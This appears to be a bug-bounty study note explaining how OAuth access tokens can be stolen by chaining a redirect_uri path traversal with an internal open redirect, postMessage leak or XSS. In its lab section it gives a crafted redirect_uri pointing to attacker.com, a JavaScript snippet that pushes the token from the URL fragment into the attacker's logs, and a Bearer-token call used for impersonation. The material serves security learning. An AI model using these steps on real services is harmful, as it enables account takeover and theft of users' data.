# 💀 OAuth: Proxy Page Attack (Middleman Bypass)

**Researcher:** `X-ploit`

**Category:** Web Security / Bug Bounty

**Theme:** Dark Hacker Terminal

---

## 🟢 Feynman-Style Explanation (The Simple Logic)

> [!abstract] **The Scenario**
> 
> Sometimes an OAuth server is "well protected":
> 
> - It **only** allows `redirect_uri` to trusted domains.
>     
> - You **cannot** directly send tokens to an external server you control.
>     
> - **Result:** A direct attack fails.
>     

### 💡 The "Proxy Page" Pivot

Instead of attacking the server head-on, you use a **trusted page** inside the target site as a middleman (proxy).

1. Send the token to a **trusted internal page**.
    
2. That page must have its own **vulnerability**.
    
3. The vulnerability **leaks or forwards** the token to your server.
    

---

## 🛠️ How It Works (Step-by-Step)

|**Step**|**Action**|**Description**|
|---|---|---|
|**1**|**Control Path**|Gain control over part of the `redirect_uri`.|
|**2**|**Traversal**|Redirect to another page on the same domain (e.g., `/oauth-callback/../some-page`).|
|**3**|**Exploit Bug**|Target a page with a bug: Open Redirect, Insecure `postMessage`, or XSS/HTML Injection.|
|**4**|**Delivery**|OAuth sends the token to the trusted page.|
|**5**|**Leak**|The trusted page forwards/leaks the secret to the attacker.|

> [!caution] **Why This Works**
> 
> OAuth trusts the domain, so it allows the redirect. Because the domain itself is internally vulnerable, you chain the two issues to bypass strict validation indirectly.

---

## 🏢 The Analogy: The Broken Receptionist

Imagine a secure delivery system with a strict "No Strangers" rule:

- **The Rule:** The company refuses to deliver packages to strangers (attackers); it only delivers to trusted buildings.
    
- **The Trick:** The attacker sends a package to a **trusted building**.
    
- **The Weak Link:** Inside that building, there is a **broken receptionist**.
    
- **The Theft:** The receptionist blindly forwards the package to the attacker.
    
- **The Reality:** The system was secure, but the internal building was not.

## 🧪 Real-World Lab: Execution Flow

### 1. Bypass & Discovery

- **Path Traversal:** Use `redirect_uri = /oauth-callback/../post` to force the token to `/post`.
    
- **Vulnerability:** Discover `/post/next?path=URL` is an **Open Redirect**.
    

### 2. The Chain

Craft the final URL:

`redirect_uri = /oauth-callback/../post/next?path=attacker.com`

### 3. Exfiltration (Implicit Flow)

The token appears in the URL fragment: `#access_token=XYZ`.

JavaScript

```
// Attacker script to extract token from fragment
<script>
  window.location = '/?' + document.location.hash.substr(1)
</script>
```

_👉 This sends the token directly to the attacker's logs._

### 4. Impersonation

The stolen token is used to call APIs and retrieve victim data:

`GET /me`

`Authorization: Bearer XYZ`

---

## ☣️ Advanced Variants & Root Issues

### 📡 The `postMessage` Proxy

Instead of a redirect, a vulnerable page might use:

`postMessage(*)`

This sends the full URL (including the token) to any listening window, including an attacker-controlled frame.

### 🔍 Technical Root Causes

- **Internal Trust:** Whitelists allow redirects to internal pages without checking if those pages are vulnerable.
    
- **Leakage Points:** Internal pages leak tokens via redirects, JavaScript, or HTTP headers.
    
- **Browser Exposure:** Tokens are exposed in the browser via the Implicit Flow.
    

---

> [!important] **One-Line Takeaway**
> 
> Even with strict domain whitelisting, attackers can chain internal vulnerabilities to turn trusted pages into proxies, leaking OAuth tokens and compromising accounts.
